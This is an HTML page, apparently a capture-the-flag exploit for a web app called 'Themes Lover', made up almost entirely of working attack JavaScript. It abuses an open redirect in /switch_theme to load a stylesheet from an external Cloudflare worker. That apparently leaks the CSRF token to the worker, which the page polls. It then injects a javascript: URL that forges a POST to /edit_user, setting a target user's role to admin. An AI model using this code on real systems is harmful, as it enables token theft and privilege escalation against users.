<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="utf-8">
  <title>Themes Lover exploit</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<pre id="log">starting...</pre>

<script>
const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
const TARGET_ORIGIN = "http://localhost:5000";
const TARGET_USER_ID = "702762c6-8766-4ce8-8146-065cc4535363";

// 每次重新 report 都換新的 id
const id = "run004";

const logEl = document.getElementById("log");
function log(...xs) {
  const s = xs.join(" ");
  console.log(s);
  logEl.textContent += "\n" + s;
}

const workerHost = new URL(WORKER_BASE).host;

// 讓 /edit_user 頁面的 stylesheet 轉去你的 worker
const innerTheme =
  `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;

const victimUrl =
  `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;

let victimWin = null;
let navTimer = null;
let pollTimer = null;
let finished = false;

function navVictim() {
  const u = victimUrl + "#r=" + Math.random();
  try {
    if (!victimWin || victimWin.closed) {
      victimWin = window.open(u, "victim");
    } else {
      victimWin.location = u;
    }
  } catch (e) {
    log("[!] nav error", String(e));
  }
}

async function getState() {
  const r = await fetch(`${WORKER_BASE}/state/${id}?r=${Math.random()}`, {
    cache: "no-store"
  });
  return await r.json();
}

function sendFinal(token) {
  if (finished) return;
  finished = true;
  clearInterval(navTimer);
  clearInterval(pollTimer);

  log("[+] token =", token);
  log("[+] sending final POST via victim window");

  const js = `javascript:(() => {
    try {
      const f = document.createElement('form');
      f.method = 'POST';
      f.action = '/edit_user';
      f.innerHTML = \`
        <input name="user_id" value="${TARGET_USER_ID}">
        <input name="username" value="">
        <input name="password" value="">
        <input name="role" value="admin">
        <input name="csrf_token" value="${token}">
      \`;
      document.body.appendChild(f);
      f.submit();
    } catch (e) {}
  })()`;

  victimWin.location = js;
  log("[+] submitted");
}

async function poll() {
  try {
    const st = await getState();
    log(`[i] prefix="${st.prefix || ""}" len=${(st.prefix || "").length} done=${st.done}`);

    if (st.done && st.token) {
      sendFinal(st.token);
    }
  } catch (e) {
    log("[!] poll error", String(e));
  }
}

log("[*] id =", id);
log("[*] victimUrl =", victimUrl);

// 先打一次
navVictim();
poll();

// 這組節奏先用這個
navTimer = setInterval(navVictim, 180);
pollTimer = setInterval(poll, 80);
</script>
</body>
</html>
